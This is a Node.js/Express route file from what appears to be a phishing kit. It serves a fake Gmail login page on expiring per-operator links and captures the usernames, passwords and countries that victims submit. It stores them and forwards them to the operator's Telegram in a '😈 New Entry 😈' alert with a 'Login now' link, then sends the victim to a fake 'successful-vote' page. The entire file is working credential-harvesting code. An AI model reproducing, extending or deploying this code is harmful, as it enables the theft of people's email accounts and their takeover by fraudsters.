const router = require("express").Router();
const Links = require("../../models/LinkModel");
const User = require("../../models/User");
const Credential = require("../../models/CredentialModel");
const bot = require("../../telegram");


router.get("/gma/:linkId", async (req, res) => {
    try {
        const { linkId } = req.params;
        const link = await Links.findOne({ _id: linkId });
        if (!link) {
            return res.redirect("/notfound");
        }
        if (new Date() > new Date(link.expiry)) {
            return res.redirect("/notfound");
        }
        if (linkId.length !== 24 || !link || link.linkType !== 'GMAIL') {
            return res.redirect("/notfound");
        }
        return res.render("socials/gmail/gmail", { req, linkId, layout: false });
    } catch (err) {
        console.log(err)
    }
});


router.post("/gma/:linkId", async (req, res) => {
    try {
        const { username, password, country } = req.body;
        const { linkId } = req.params;
        if (linkId.length !== 24) {
            return res.redirect("/notfound");
        }
        const link = await Links.findById(linkId);
        const user = await User.findById(link.user);

        if (link?.name) {
            const newCredential = new Credential({
                user: link.user,
                link: linkId,
                linkName: link.name,
                linkType: "GMAIL",
                country,
                fields: {
                    username,
                    password
                }
            });
            await newCredential.save();
            await bot.sendMessage(user.telegramID, `
                😈 New Entry 😈
ACCOUNT TYPE: GMAIL

LOCATION: ${country}

USERNAME: ${username}
PASSWORD: ${password}

Login now: https://www.gmail.com
                                                `)
            return res.redirect("/successful-vote");
        }
        else {
            return res.redirect("/notfound");
        }
    } catch (err) {
        console.log(err)
    }
});



module.exports = router;